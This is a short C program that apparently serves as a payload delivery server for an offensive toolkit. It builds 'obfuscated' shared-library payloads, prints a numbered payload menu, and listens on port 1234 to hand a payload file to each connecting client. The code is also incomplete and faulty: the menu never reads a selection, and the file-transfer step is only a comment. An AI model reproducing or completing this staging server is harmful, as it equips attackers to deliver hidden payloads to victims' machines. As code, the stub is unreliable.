#include <sys/socket.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h> 
#include <sys/wait.h>

#define port 1234
#define addr INADDR_ANY

void main(){
  FILE *fp;
  char buff[255];
  int host_sock, client_sock, file_size, i = 0;
  struct sockaddr_in host_addr;

  // setup and open listening socket
  host_sock = socket(AF_INET, SOCK_STREAM, 0);
  host_addr.sin_family = AF_INET;
  host_addr.sin_port = htons(port);
  host_addr.sin_addr.s_addr = addr;
  bind(host_sock, (struct sockaddr *)&host_addr, sizeof(host_addr));
  listen(host_sock, 0);

  // create list of payloads
  system("cd ../../payloads; make obfuscated; ls | grep .so > /tmp/tmp.txt");

  // payload selection menu
  fp = fopen("/tmp/tmp.txt", "r");
  fscanf(fp, "%s", buff);
  while(!feof(fp)){
    printf("%d : %s\n", i++, buff);
    fscanf(fp, "%s", buff);
  }
  fseek(fp, 0, SEEK_SET);
  fclose(fp);

  // process each connection
  while(1){
    client_sock = accept(host_sock, NULL, NULL);
    if(client_sock > 0){
	fp = fopen(buff, "r");
	// write file size and content to socket
	fclose(fp);
    }
  }
}
